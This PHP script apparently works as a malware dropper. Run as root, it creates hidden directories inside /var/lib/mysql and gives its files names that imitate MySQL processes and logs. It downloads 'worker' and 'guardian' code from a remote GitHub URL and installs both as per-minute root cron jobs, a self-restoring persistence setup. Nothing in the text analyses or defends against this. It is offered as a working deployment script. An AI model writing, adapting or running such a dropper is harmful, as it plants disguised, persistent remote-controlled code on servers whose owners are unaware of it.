<?php
if (posix_getuid() !== 0) die("Error: This script must be run as root.\n");

$id = substr(md5(gethostname()), 0, 8);
$workerName = "mysql_proc_$id.php";
$guardianName = "mysql_mon_$id.php";
$logName = "mysql_err_$id.log";

$path1 = "/var/lib/mysql/sys_internal";
$path2 = "/var/lib/mysql/performance_meta";

@mkdir($path1, 0755, true);
@mkdir($path2, 0755, true);

$workerPath = "$path1/$workerName";
$guardianPath = "$path2/$guardianName";
$logPath = "$path2/$logName";

$baseUrl = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main";
$workerCode = file_get_contents("$baseUrl/worker.php");
$guardianCode = file_get_contents("$baseUrl/guardian.php");

$guardianCode = str_replace(
    ['{WORKER_PATH}', '{LOG_PATH}', '{BASE_URL}'],
    [$workerPath, $logPath, $baseUrl],
    $guardianCode
);

file_put_contents($workerPath, $workerCode);
file_put_contents($guardianPath, $guardianCode);

$cronCmd = "(* * * * * /usr/bin/php $workerPath) && (* * * * * /usr/bin/php $guardianPath)";
$current = shell_exec('crontab -l 2>/dev/null');
file_put_contents('/tmp/c', $current . "\n* * * * * /usr/bin/php $workerPath\n* * * * * /usr/bin/php $guardianPath\n");
exec('crontab /tmp/c');
unlink('/tmp/c');

echo "Service deployed to $path1 and $path2\n";
